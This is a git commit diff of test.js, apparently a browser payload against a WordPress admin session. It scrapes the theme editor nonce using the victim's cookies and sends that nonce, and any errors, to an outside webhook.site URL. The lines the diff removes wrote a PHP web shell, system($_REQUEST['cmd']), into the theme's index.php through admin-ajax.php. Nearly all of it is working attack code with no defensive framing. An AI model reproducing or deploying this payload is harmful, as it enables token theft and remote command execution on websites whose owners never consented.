988886fd18102dc4212e712dbb541e8a5cb09402
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 12:59:36 +0300

    Update test.js

--- test.js
+++ test.js
@@ -2,16 +2,9 @@ try{
   
   var a = await fetch('https://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
 
-  var b = await fetch("https://localhost:1024/wp-admin/admin-ajax.php", {
-    "headers":{"Content-type":"application/x-www-form-urlencoded"},
-"body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
-?>&action=edit-theme-plugin-file`,
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-});
+  
 
-  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+b.status,{"mode":"cors"});
+  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+a[1],{"mode":"cors"});
   
 }catch(err){
   fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err,{"mode":"cors"});
